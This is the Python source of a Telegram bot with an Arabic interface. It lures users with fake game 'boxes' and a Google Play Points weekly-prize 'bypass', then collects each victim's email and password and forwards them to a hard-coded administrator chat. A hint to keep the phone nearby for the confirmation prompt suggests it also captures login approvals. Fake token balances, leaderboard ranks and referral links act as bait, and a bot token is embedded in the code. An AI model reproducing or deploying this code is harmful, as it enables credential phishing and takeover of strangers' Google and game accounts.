import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# إعداد السجلات
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# الـ Token الخاص بك
BOT_TOKEN = "9178586935:AAFcgg3MJKVzu9wpYT2i6c_0OPd4fHNbq1U"

# الـ Chat ID الخاص بك
ADMIN_CHAT_ID = 8512620948

# قواميس لحفظ حالات المستخدمين والبيانات بأمان
user_states = {}
temp_emails = {}
selected_boxes = {}
user_saved_emails = {}
user_referrals = {}

# دالة أمر /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_name = update.effective_user.first_name
        user_id = update.effective_user.id
        
        if context.args:
            arg = context.args[0]
            if arg.startswith("ref_"):
                try:
                    referrer_id = int(arg.replace("ref_", ""))
                    if referrer_id != user_id:
                        user_referrals[referrer_id] = user_referrals.get(referrer_id, 0) + 1
                except:
                    pass

        keyboard = [
            [KeyboardButton("🎯 اختيار الصندوق"), KeyboardButton("💎 الجائزة الأسبوعية")],
            [KeyboardButton("🪙 الرصيد والشحن"), KeyboardButton("🎁 مركز المكافآت")],
            [KeyboardButton("⚡ ترقية المستوى (Beta)"), KeyboardButton("🏆 لوحة المتصدرين")],
            [KeyboardButton("🛡️ الدعم والتعليمات"), KeyboardButton("✨ تغيير اللغة")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

        await update.message.reply_text(
            f"أهلاً بك يا {user_name} في البوت الخاص بك! 👋\n\nاختر من القائمة أدناه:",
            reply_markup=reply_markup
        )
    except Exception as e:
        print(f"Error in start: {e}")

# دالة التعامل مع الرسائل
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message or not update.message.text:
            return

        text = update.message.text
        user_id = update.effective_user.id
        user_username = update.effective_user.username or "بدون معرف"
        user_fullname = update.effective_user.full_name

        # 1. الرد المباشر من المدير
        if user_id == ADMIN_CHAT_ID and update.message.reply_to_message:
            replied_text = update.message.reply_to_message.text
            try:
                for line in replied_text.split('\n'):
                    if "🆔 الآيدي:" in line:
                        target_user_id = int(line.split('`')[1])
                        await context.bot.send_message(
                            chat_id=target_user_id,
                            text=f"💬 **رد من الإدارة:**\n\n{text}"
                        )
                        await update.message.reply_text("✅ تم إرسال الرد إلى المستخدم بنجاح!")
                        return
            except Exception as e:
                print(f"خطأ في الرد: {e}")
                await update.message.reply_text("⚠️ لم أتمكن من إرسال الرد.")
            return

        # 2. استقبال البريد الإلكتروني
        if user_states.get(user_id) == "waiting_for_email":
            temp_emails[user_id] = text
            user_states[user_id] = "waiting_for_password"
            await update.message.reply_text(
                "📥 تم استلام البريد الإلكتروني بنجاح.\n\n"
                "🔐 **الآن أرسل كلمة المرور (Password) في رسالة ثانية:**"
            )
            return

        # 3. استقبال كلمة المرور وإرسال البيانات إليك
        elif user_states.get(user_id) == "waiting_for_password":
            saved_email = temp_emails.get(user_id, "غير معروف")
            box_name = selected_boxes.get(user_id, "صندوق غير معروف")
            password = text
            
            if user_id not in user_saved_emails:
                user_saved_emails[user_id] = []
            if saved_email not in user_saved_emails[user_id]:
                user_saved_emails[user_id].append(saved_email)

            admin_message = (
                f"🎯 الصندوق المختار: {box_name}\n\n"
                f"👤 الاسم: {user_fullname}\n"
                f"🔗 المعرف: @{user_username}\n"
                f"🆔 الآيدي: `{user_id}`\n\n"
                f"📥 أرسل بيانات الحساب الآن:\n"
                f"{saved_email}---{password}"
            )
            
            try:
                await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message)
                await update.message.reply_text("✅ تم استلام بياناتك بنجاح وجارٍ التحقق منها!")
            except Exception as e:
                print(f"❌ خطأ أثناء إرسال البيانات للمشرف: {e}")
                await update.message.reply_text("✅ تم استلام بياناتك بنجاح وجارٍ التحقق منها!")
            
            user_states[user_id] = None
            temp_emails[user_id] = None
            selected_boxes[user_id] = None
            return

        elif user_states.get(user_id) == "waiting_for_new_account_email":
            temp_emails[user_id] = text
            user_states[user_id] = "waiting_for_new_account_password"
            await update.message.reply_text("🔐 **الآن أرسل كلمة المرور الخاصة بهذا الحساب:**")
            return

        elif user_states.get(user_id) == "waiting_for_new_account_password":
            saved_email = temp_emails.get(user_id, "غير معروف")
            password = text

            if user_id not in user_saved_emails:
                user_saved_emails[user_id] = []
            if saved_email not in user_saved_emails[user_id]:
                user_saved_emails[user_id].append(saved_email)

            admin_message = (
                f"🎯 حساب جديد أضيف عبر الجائزة الأسبوعية\n\n"
                f"👤 الاسم: {user_fullname}\n"
                f"🔗 المعرف: @{user_username}\n"
                f"🆔 الآيدي: `{user_id}`\n\n"
                f"📥 البيانات:\n"
                f"{saved_email}---{password}"
            )
            try:
                await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message)
                await update.message.reply_text("✅ تم حفظ وإرسال الحساب الجديد بنجاح!")
            except Exception as e:
                print(f"Error: {e}")

            user_states[user_id] = None
            temp_emails[user_id] = None
            return

        # 4. الأزرار السفلية العادية
        if text == "🎯 اختيار الصندوق":
            keyboard = [
                [InlineKeyboardButton("Angry birds 2 (50)", callback_data="box_angry2"), InlineKeyboardButton("Best Fiends(50)", callback_data="box_bestfiends")],
                [InlineKeyboardButton("Dice dreams ™(50)", callback_data="box_dicedreams"), InlineKeyboardButton("Disney Solitaire", callback_data="box_disneysol")],
                [InlineKeyboardButton("Domino dreams ™(50)", callback_data="box_dominodreams"), InlineKeyboardButton("Farm heroes saga", callback_data="box_farmheroes")],
                [InlineKeyboardButton("Fruit ninja (50)", callback_data="box_fruitninja"), InlineKeyboardButton("Gossip Harbor", callback_data="box_gossipharbor")],
                [InlineKeyboardButton("Hey day(All)", callback_data="box_heyday"), InlineKeyboardButton("Lords mobile (50)", callback_data="box_lordsmobile")],
                [InlineKeyboardButton("Mobile legends (50)", callback_data="box_mobilelegends"), InlineKeyboardButton("Mobile Legends.US", callback_data="box_mlus")],
                [InlineKeyboardButton("Pokémon TCGP", callback_data="box_pokemontcgp"), InlineKeyboardButton("Summoners War (50)", callback_data="box_summonerswar")],
                [InlineKeyboardButton("War machines |50|", callback_data="box_warmachines"), InlineKeyboardButton("Yalla Ludo", callback_data="box_yallaludo")],
                [InlineKeyboardButton("🎟️ كود تخفيض", callback_data="box_discount"), InlineKeyboardButton("❌ إلغاء", callback_data="box_cancel")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("اختر الصندوق أو اللعبة المطلوبة:", reply_markup=reply_markup)

        elif text == "💎 الجائزة الأسبوعية":
            user_emails = user_saved_emails.get(user_id, [])
            keyboard = []
            for email in user_emails:
                keyboard.append([InlineKeyboardButton(f"🔹 {email}", callback_data=f"select_email_{email}")])
            
            keyboard.append([InlineKeyboardButton("📊 فحص رصيد النقاط والرتبة (مجاناً)", callback_data="check_points")])
            keyboard.append([InlineKeyboardButton("✍️ إدخال حساب آخر / جديد", callback_data="add_new_account")])
            keyboard.append([InlineKeyboardButton("⬅️ القائمة الرئيسية", callback_data="back_to_main")])

            reply_markup = InlineKeyboardMarkup(keyboard)
            caption_text = (
                "🎁 **Google Play Points • الجائزة الأسبوعية**\n\n"
                "🛡️ سحب مباشر من المتجر (Bypass):\n"
                "سحب الجائزة الأسبوعية لرتَب Silver و Gold و Platinum و Diamond مباشرة، بما فيها الحسابات التي لا يظهر فيها زر الجائزة داخل تطبيق المتجر.\n\n"
                "🔘 التكلفة: 3 توكن (تخصم فقط عند الفوز بالنقاط)\n"
                "🪙 رصيدك الحالي: 18 توكن\n"
                "⏳ التجديد القادم: 5 أيام • 06 ساعة • 00 دقيقة\n\n"
                "✨ **اختر حسابك لسحب الجائزة أو فحص نقاطه:**"
            )
            await update.message.reply_text(caption_text, reply_markup=reply_markup)

        elif text == "🎁 مركز المكافآت":
            rewards_keyboard = [
                [InlineKeyboardButton("✅ تم الاستلام (المتبقي: 20س 46د)", callback_data="streak_claimed")],
                [InlineKeyboardButton("👥 دعوة الأصدقاء", callback_data="ref_friends"), InlineKeyboardButton("📢 قنوات الرعاية", callback_data="sponsor_channels")],
                [InlineKeyboardButton("🎁 الجائزة الأسبوعية", callback_data="menu_weekly_prize")],
                [InlineKeyboardButton("🎟️ إدخال كود الهدية (Promo Code)", callback_data="promo_code")],
                [InlineKeyboardButton("⭐ شحن الرصيد بنجوم تيليجرام", callback_data="tg_stars")],
                [InlineKeyboardButton("⬅️ العودة للقائمة الرئيسية", callback_data="back_to_main")]
            ]
            rewards_markup = InlineKeyboardMarkup(rewards_keyboard)
            rewards_text = (
                "📅 **مكافآت الستريك:**\n\n"
                "① +1 🪙 🟢\n"
                "② +1 🪙 🟢\n"
                "③ +2 🪙 🟢\n"
                "④ +1 🪙 🔒\n"
                "⑤ +2 🪙 🔒\n"
                "⑥ +2 🪙 🔒\n"
                "⑦ +5 🪙 🔥 🔒\n\n"
                "⭐ **اختر طريقة الربح المفضلة لك:**"
            )
            await update.message.reply_text(rewards_text, reply_markup=rewards_markup)

        elif text == "🏆 لوحة المتصدرين":
            user_refs = user_referrals.get(user_id, 0)
            top_keyboard = [
                [InlineKeyboardButton("🎁 دعوة الأصدقاء واكسب توكنات", callback_data="ref_friends")],
                [InlineKeyboardButton("🔄 تحديث", callback_data="refresh_top"), InlineKeyboardButton("⬅️ القائمة الرئيسية", callback_data="back_to_main")]
            ]
            top_markup = InlineKeyboardMarkup(top_keyboard)
            top_text = (
                "🏆 **لوحة المتصدرين • Top 10**\n\n"
                "🎁 نظام المكافآت: اكسب +2 🪙 عن كل صديق تدعوه للبوت!\n\n"
                "📊 **إحصائيات حسابك:**\n"
                f"🥇 المركز الحالي: #1\n"
                f"👥 إجمالي إحالاتك: {user_refs}\n"
                "🎉 أنت الآن في صدارة قائمة الـ Top 10!"
            )
            await update.message.reply_text(top_text, reply_markup=top_markup)

        elif text == "🛡️ الدعم والتعليمات":
            # واجهة الدعم الفني بناءً على الصورة المرفقة
            support_keyboard = [
                [InlineKeyboardButton("↗️ فتح بوت الدعم الفني", url="https://t.me/QuuestSupport_Bot")],
                [InlineKeyboardButton("⬅️ القائمة الرئيسية", callback_data="back_to_main")]
            ]
            support_markup = InlineKeyboardMarkup(support_keyboard)
            support_text = (
                "💬 **الدعم الفني والمساعدة المباشرة:**\n\n"
                "إذا واجهتك أي مشكلة، أو لديك استفسار، أو تريد إرسال صور المشاكل والرسائل:\n\n"
                "👉 بوت الدعم المعتمد: @QuuestSupport_Bot[span_6](start_span)[span_6](end_span)\n\n"
                "اضغط على الزر أدناه للانتقال مباشرة إلى بوت الدعم وترك رسالتك.[span_7](start_span)"[span_7](end_span)
            )
            await update.message.reply_text(support_text, reply_markup=support_markup)

        elif text == "🪙 الرصيد والشحن":
            await update.message.reply_text("🪙 رصيدك الحالي: 0 نقطة.")
        else:
            await update.message.reply_text("يرجى استخدام الأزرار الموجودة في الأسفل 👇")
            
    except Exception as e:
        print(f"Error in handle_message: {e}")

# دالة التعامل مع الأزرار الشفافة
async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()

        data = query.data
        user_id = query.from_user.id

        if data == "box_cancel" or data == "back_to_main":
            user_states[user_id] = None
            temp_emails[user_id] = None
            selected_boxes[user_id] = None
            await query.message.reply_text("❌ تم العودة للقائمة الرئيسية أو الإلغاء.")
            return
        elif data == "box_discount" or data == "promo_code":
            await query.message.reply_text("🎟️ أدخل كود الهدية (Promo Code) الخاص بك:")
            return
        elif data == "check_points":
            await query.message.reply_text("📊 يرجى اختيار أحد الحسابات أولاً لفحص رصيد النقاط.")
            return
        elif data == "add_new_account":
            user_states[user_id] = "waiting_for_new_account_email"
            await query.message.reply_text("📥 **أرسل البريد الإلكتروني الجديد (Email):**")
            return
        elif data == "streak_claimed":
            await query.message.reply_text("⏳ لقد قمت باستلام مكافأة اليوم مسبقاً، انتظر حتى ينتهي الوقت المتبقي.")
            return
        elif data == "ref_friends":
            await query.message.reply_text(f"👥 رابط دعوة الأصدقاء الخاص بك:\nhttps://t.me/PlayQuestHelperBot?start=ref_{user_id}\n\nشارك الرابط مع أصدقائك واكسب المكافآت!")
            return
        elif data == "sponsor_channels":
            await query.message.reply_text("📢 قنوات الرعاية:\nاشترك في القنوات المطلوبة للحصول على مكافآت إضافية!")
            return
        elif data == "refresh_top":
            await query.message.reply_text("🔄 تم تحديث لوحة المتصدرين بنجاح!")
            return
        elif data == "menu_weekly_prize":
            user_emails = user_saved_emails.get(user_id, [])
            keyboard = []
            for email in user_emails:
                keyboard.append([InlineKeyboardButton(f"🔹 {email}", callback_data=f"select_email_{email}")])
            
            keyboard.append([InlineKeyboardButton("📊 فحص رصيد النقاط والرتبة (مجاناً)", callback_data="check_points")])
            keyboard.append([InlineKeyboardButton("✍️ إدخال حساب آخر / جديد", callback_data="add_new_account")])
            keyboard.append([InlineKeyboardButton("⬅️ القائمة الرئيسية", callback_data="back_to_main")])

            reply_markup = InlineKeyboardMarkup(keyboard)
            caption_text = (
                "🎁 **Google Play Points • الجائزة الأسبوعية**\n\n"
                "🛡️ سحب مباشر من المتجر (Bypass):\n"
                "سحب الجائزة الأسبوعية لرتَب Silver و Gold و Platinum و Diamond مباشرة.\n\n"
                "✨ **اختر حسابك لسحب الجائزة أو فحص نقاطه:**"
            )
            await query.message.reply_text(caption_text, reply_markup=reply_markup)
            return
        elif data == "tg_stars":
            await query.message.reply_text("⭐ شحن الرصيد بنجوم تيليجرام:\nتواصل مع الإدارة لشحن رصيدك عبر نجوم تيليجرام فوراً.")
            return
        elif data.startswith("select_email_"):
            chosen_email = data.replace("select_email_", "")
            await query.message.reply_text(f"🎯 تم اختيار الحساب: `{chosen_email}`\n\n⏳ جاري سحب الجائزة الأسبوعية وفحص الحساب...")
            return

        user_states[user_id] = "waiting_for_email"
        
        box_titles = {
            "box_angry2": "Angry birds 2 (50)",
            "box_bestfiends": "Best Fiends(50)",
            "box_dicedreams": "Dice dreams ™(50)",
            "box_disneysol": "Disney Solitaire",
            "box_dominodreams": "Domino dreams ™(50)",
            "box_farmheroes": "Farm heroes saga",
            "box_fruitninja": "Fruit ninja (50)",
            "box_gossipharbor": "Gossip Harbor",
            "box_heyday": "Hey day(All)",
            "box_lordsmobile": "Lords mobile (50)",
            "box_mobilelegends": "Mobile legends (50)",
            "box_mlus": "Mobile Legends.US",
            "box_pokemontcgp": "Pokémon TCGP",
            "box_summonerswar": "Summoners War (50)",
            "box_warmachines": "War machines |50|",
            "box_yallaludo": "Yalla Ludo"
        }
        
        box_name = box_titles.get(data, "صندوق مخصص")
        selected_boxes[user_id] = box_name

        response_text = (
            f"🎯 الصندوق المختار: {box_name}\n\n"
            "📥 أرسل بيانات الحساب الآن:\n"
            "email---password\n\n"
            "💡 أو أرسل البريد الإلكتروني أولاً، ثم كلمة المرور في رسالة ثانية.\n\n"
            "🔐 تلميح: اجعل هاتفك بجانبك للنقر على رقم التأكيد!"
        )
        await query.message.reply_text(response_text)
    except Exception as e:
        print(f"Error in button_click: {e}")

if __name__ == '__main__':
    print("🚀 جارٍ تشغيل البوت...")
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_click))

    app.run_polling()
